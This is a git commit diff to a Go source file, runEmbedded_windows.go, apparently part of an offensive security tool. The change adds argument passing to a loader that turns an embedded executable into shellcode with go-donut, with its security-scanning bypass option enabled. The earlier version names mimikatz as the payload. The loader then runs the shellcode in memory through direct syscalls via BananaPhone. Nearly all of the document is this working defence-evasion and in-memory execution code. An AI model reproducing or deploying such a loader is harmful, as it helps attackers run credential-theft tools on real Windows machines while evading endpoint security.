34e87765b3b85c18e5442769e75012078311aafa
nodauf <nodauf@krutt.org>
2020-12-19 22:04:47 +0100

    Support arguments

--- src/controllers/runEmbedded_windows.go
+++ src/controllers/runEmbedded_windows.go
@@ -1,12 +1,14 @@
 package controllers
 
 import (
-    "fmt"
-    "log"
+	"bytes"
+	"fmt"
+	"syscall"
+	"time"
+	"unsafe"
 
-    "github.com/Binject/go-donut/donut"
-    bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
-    clr "github.com/ropnop/go-clr"
+	"github.com/Binject/go-donut/donut"
+	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
 )
 
 var TARGET_VERSION = "v2"
@@ -17,92 +19,96 @@ func checkFatalErr(err error) {
 	}
 }
 
-func PrintEmbeddedFiles(){
-    _, children_files := listEmbeddedFiles()
-    for _, value := range children_files{
-        fmt.Println(value)
-    }
+func PrintEmbeddedFiles() {
+	_, children_files := listEmbeddedFiles()
+	for _, value := range children_files {
+		fmt.Println(value)
+	}
 }
 
-func RunEmbeddedBinary(binary string, arguments []string){
-        mimikatz := readEmbeddedBinary(binary)
-        //mimikatz, err := ioutil.ReadFile(".\\mimikatz.exe")
+func RunEmbeddedBinary(binary string, arguments []string) {
+	binaryBytes := readEmbeddedBinary(binary)
+	argumentBinary := " "
+	if len(arguments) > 0 {
+		argumentBinary = arguments[0]
+	}
 
-        shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(mimikatz), &donut.DonutConfig{
-                Arch:     donut.X84,
-                Type:     donut.DONUT_MODULE_EXE,
-                InstType: donut.DONUT_INSTANCE_PIC,
-                Entropy:  donut.DONUT_ENTROPY_DEFAULT,
-                Compress: 1,
-                Format:   1,
-                Bypass:   3,
-        })
+	shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(binaryBytes), &donut.DonutConfig{
+		Arch:       donut.X84,
+		Type:       donut.DONUT_MODULE_EXE,
+		InstType:   donut.DONUT_INSTANCE_PIC,
+		Entropy:    donut.DONUT_ENTROPY_DEFAULT,
+		Compress:   1,
+		Format:     1,
+		Bypass:     3,
+		Parameters: argumentBinary,
+	})
 
-        bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
-        checkFatalErr(err)
+	bp, err := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
+	checkFatalErr(err)
 
-        alloc, err := bp.GetSysID("NtAllocateVirtualMemory")
-        checkFatalErr(err)
-        protect, err := bp.GetSysID("NtProtectVirtualMemory")
-        checkFatalErr(err)
-        createthread, err := bp.GetSysID("NtCreateThreadEx")
-        checkFatalErr(err)
+	alloc, err := bp.GetSysID("NtAllocateVirtualMemory")
+	checkFatalErr(err)
+	protect, err := bp.GetSysID("NtProtectVirtualMemory")
+	checkFatalErr(err)
+	createthread, err := bp.GetSysID("NtCreateThreadEx")
+	checkFatalErr(err)
 
-        // create thread on shellcode
-        const (
-                //special macro that says 'use this thread/process' when provided as a handle.
-                thisThread = uintptr(0xffffffffffffffff)
-                memCommit  = uintptr(0x00001000)
-                memreserve = uintptr(0x00002000)
-        )
+	// create thread on shellcode
+	const (
+		//special macro that says 'use this thread/process' when provided as a handle.
+		thisThread = uintptr(0xffffffffffffffff)
+		memCommit  = uintptr(0x00001000)
+		memreserve = uintptr(0x00002000)
+	)
 
-        var baseA uintptr
-        regionsize := uintptr(len(shellcode.Bytes()))
-        _, err = bananaphone.Syscall(
-                alloc, //ntallocatevirtualmemory
-                thisThread,
-                uintptr(unsafe.Pointer(&baseA)),
-                0,
-                uintptr(unsafe.Pointer(&regionsize)),
-                uintptr(memCommit|memreserve),
-                syscall.PAGE_READWRITE,
-        )
-        checkFatalErr(err)
+	var baseA uintptr
+	regionsize := uintptr(len(shellcode.Bytes()))
+	_, err = bananaphone.Syscall(
+		alloc, //ntallocatevirtualmemory
+		thisThread,
+		uintptr(unsafe.Pointer(&baseA)),
+		0,
+		uintptr(unsafe.Pointer(&regionsize)),
+		uintptr(memCommit|memreserve),
+		syscall.PAGE_READWRITE,
+	)
+	checkFatalErr(err)
 
-        bananaphone.WriteMemory(shellcode.Bytes(), baseA)
+	bananaphone.WriteMemory(shellcode.Bytes(), baseA)
 
-        var oldprotect uintptr
-        _, err = bananaphone.Syscall(
-                protect, //NtProtectVirtualMemory
-                thisThread,
-                uintptr(unsafe.Pointer(&baseA)),
-                uintptr(unsafe.Pointer(&regionsize)),
-                syscall.PAGE_EXECUTE_READ,
-                uintptr(unsafe.Pointer(&oldprotect)),
-        )
-        checkFatalErr(err)
+	var oldprotect uintptr
+	_, err = bananaphone.Syscall(
+		protect, //NtProtectVirtualMemory
+		thisThread,
+		uintptr(unsafe.Pointer(&baseA)),
+		uintptr(unsafe.Pointer(&regionsize)),
+		syscall.PAGE_EXECUTE_READ,
+		uintptr(unsafe.Pointer(&oldprotect)),
+	)
+	checkFatalErr(err)
 
-        var hhosthread uintptr
-        _, err = bananaphone.Syscall(
-                createthread,                         //NtCreateThreadEx
-                uintptr(unsafe.Pointer(&hhosthread)), //hthread
-                0x1FFFFF,                             //desiredaccess
-                0,                                    //objattributes
-                thisThread,                           //processhandle
-                baseA,                                //lpstartaddress
-                0,                                    //lpparam
-                uintptr(0),                           //createsuspended
-                0,                                    //zerobits
-                0,                                    //sizeofstackcommit
-                0,                                    //sizeofstackreserve
-                0,                                    //lpbytesbuffer
-        )
+	var hhosthread uintptr
+	_, err = bananaphone.Syscall(
+		createthread,                         //NtCreateThreadEx
+		uintptr(unsafe.Pointer(&hhosthread)), //hthread
+		0x1FFFFF,                             //desiredaccess
+		0,                                    //objattributes
+		thisThread,                           //processhandle
+		baseA,                                //lpstartaddress
+		0,                                    //lpparam
+		uintptr(0),                           //createsuspended
+		0,                                    //zerobits
+		0,                                    //sizeofstackcommit
+		0,                                    //sizeofstackreserve
+		0,                                    //lpbytesbuffer
+	)
 
-        _, err = syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
-        checkFatalErr(err)
+	_, err = syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
+	checkFatalErr(err)
 
-        // bit of a hack because dunno how to wait for bananaphone background thread to complete...
-        for {
-                time.Sleep(1000000000)
-        }
+	// bit of a hack because dunno how to wait for bananaphone background thread to complete...
+	for {
+		time.Sleep(1000000000)
+	}
 }
